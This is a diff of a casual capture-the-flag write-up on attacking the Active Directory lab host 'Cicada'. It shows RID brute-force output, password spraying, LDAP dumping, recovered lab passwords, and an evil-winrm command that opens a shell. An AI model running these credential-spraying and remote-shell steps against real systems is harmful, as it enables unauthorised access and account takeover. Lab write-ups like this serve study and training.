@@ -137,6 +137,9 @@ so i went to my notes on attacking AD and decided to try RID Brute Forcing with 
         SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
         SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
         [...snip]
+
+SHELL AS EMILY.CARLOS
+---
 and finally i had a list of usernames i could use  
 now i can try some password spraying  
 
@@ -150,15 +153,26 @@ now i can try some password spraying
         SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
 
 Now i had a username to go with the Password, Dev and michael.wrightson  
-tho i couldnt login to smb for whatever reason with the creds, i was stuck here for a while  
-then finally i decided to try out the creds with ldap, and they worked!
+tho i couldnt login to smb for whatever reason with the creds, i was stuck here for a while    
+then finally i decided to try out the creds with ldap, and they worked!  
 
-now i could of used LdapSearch but that would take a while to parse through and check out the data so i just used ldapdomaindump
+now i could of used LdapSearch but that would take a while to parse through and check out the data so i just used ldapdomaindump 
 **ldapdomaindump $ip  -u "cicada.htb\michael.wrightson" -p 'Cicada$M6Corpb\*@Lp#nZp!8'**
 
-from this it gave me a bunch of data, but i focused on the domain_users.html file which i hosted with python to view  
+from this it gave me a bunch of data, but i focused on the domain_users.html file which i hosted with python to view    
 ![image](https://github.com/user-attachments/assets/681402cc-012e-4276-a140-e114888b65bf)
 
-and this gave me the password for the user "emily.carlos"
+and this gave me the password for the user "david.orelious"
 
-         emily.carlos : Q!3@Lp#M6b*7t*Vt
+        david.orelious : aRt$Lp#7t*VQ!3
+these credentials worked with smb finally and allowed me to access the DEV share
+
+inside the DEV share i found 1 file "Backup_script.ps1", inside this it had plaintext credentials
+
+        emily.carlos : Q!3@Lp#M6b*7t*Vt
+more fkn checks, smh  
+but finally i got that sexy p3wned on crackmapexec for winrm  
+
+so i finally got a shell using evil-winrm  
+**evil-winrm -i $ip -u emily.carlos -p 'Q!3@Lp#M6b*7t*Vt'
+
